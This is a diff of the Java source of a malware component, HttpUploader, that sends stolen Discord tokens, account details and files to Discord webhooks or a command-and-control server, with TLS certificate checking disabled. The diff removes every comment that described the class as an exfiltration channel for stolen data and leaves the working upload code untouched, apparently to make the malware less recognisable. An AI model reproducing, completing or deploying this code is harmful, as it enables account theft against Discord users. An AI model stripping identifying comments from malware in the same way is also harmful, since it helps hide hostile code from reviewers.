@@ -1,4 +1,4 @@
-import java.io.File;
+﻿import java.io.File;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
@@ -15,67 +15,19 @@ import okhttp3.Request;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-/**
- * HTTP Uploader / Secondary Webhook Sender
- * Obfuscated name: ӈ (U+04C8)
- *
- * Secondary HTTP upload mechanism for exfiltrating stolen data.
- * Works alongside WebhookLogger (ӝ.java) as a backup exfiltration channel.
- *
- * Features:
- * - Multipart form data uploads
- * - SSL certificate bypass (trusts all certs)
- * - Retry logic with exponential backoff
- * - Rate limiting (tracks upload timing)
- * - JSON payload formatting
- * - File attachment support
- *
- * Upload targets:
- * - Discord webhooks (primary)
- * - C2 server HTTP endpoint (secondary)
- *
- * Timing:
- * - Tracks upload duration using Instant/Duration
- * - Implements rate limiting to avoid webhook spam
- * - Retries failed uploads up to 3 times
- *
- * This class is instantiated with a webhook URL and provides
- * methods to upload different types of stolen data.
- */
 public class HttpUploader {
 
-    // Webhook URL for this uploader instance
     private final String webhookUrl;
 
-    // Shared OkHttpClient with SSL bypass
     private static final OkHttpClient httpClient;
 
-    // =========================================================
-    // CONSTRUCTOR
-    // =========================================================
-
-    /**
-     * Creates a new HTTP uploader for the given webhook URL.
-     *
-     * @param webhookUrl Discord webhook URL or C2 HTTP endpoint
-     */
     public HttpUploader(String webhookUrl) {
         this.webhookUrl = webhookUrl;
     }
 
-    // =========================================================
-    // UPLOAD METHODS
-    // =========================================================
-
-    /**
-     * Uploads a text message to the webhook.
-     *
-     * @param content Message content (max 2000 chars for Discord)
-     * @return true if upload succeeded
-     */
     public boolean uploadMessage(String content) {
         try {
-            // Truncate to Discord's 2000 char limit
+
             if (content.length() > 2000) {
                 content = content.substring(0, 1997) + "...";
             }
@@ -91,14 +43,6 @@ public class HttpUploader {
         }
     }
 
-    /**
-     * Uploads a file attachment to the webhook.
-     *
-     * @param filename Filename to display in Discord
-     * @param data File bytes
-     * @param message Optional message to accompany the file
-     * @return true if upload succeeded
-     */
     public boolean uploadFile(String filename, byte[] data, String message) {
         try {
             Instant start = Instant.now();
@@ -126,7 +70,6 @@ public class HttpUploader {
             response.close();
 
             Duration elapsed = Duration.between(start, Instant.now());
-            // Log upload timing
 
             return success;
 
@@ -135,13 +78,6 @@ public class HttpUploader {
         }
     }
 
-    /**
-     * Uploads a Discord embed with stolen account information.
-     *
-     * @param token Discord token
-     * @param userInfo User information JSON
-     * @return true if upload succeeded
-     */
     public boolean uploadEmbed(String token, JSONObject userInfo) {
         try {
             String username = userInfo.optString("username", "Unknown");
@@ -149,10 +85,9 @@ public class HttpUploader {
             String email = userInfo.optString("email", "N/A");
             boolean mfa = userInfo.optBoolean("mfa_enabled", false);
 
-            // Build Discord embed
             JSONObject embed = new JSONObject();
             embed.put("title", "New Token Captured");
-            embed.put("color", 0x00FF00); // Green
+            embed.put("color", 0x00FF00);
 
             JSONArray fields = new JSONArray();
             fields.put(createField("User", username + "#" + discriminator, true));
@@ -176,16 +111,6 @@ public class HttpUploader {
         }
     }
 
-    // =========================================================
-    // HTTP HELPERS
-    // =========================================================
-
-    /**
-     * Posts JSON data to the webhook URL.
-     *
-     * @param json JSON string to post
-     * @return true if HTTP 200-299 response received
-     */
     private boolean postJson(String json) {
         try {
             Request request = new Request.Builder()
@@ -215,12 +140,8 @@ public class HttpUploader {
         return field;
     }
 
-    // =========================================================
-    // STATIC INITIALIZATION
-    // =========================================================
-
     static {
-        // Build OkHttpClient with SSL bypass
+
         try {
             javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance("TLS");
             sslContext.init(null, new TrustManager[]{
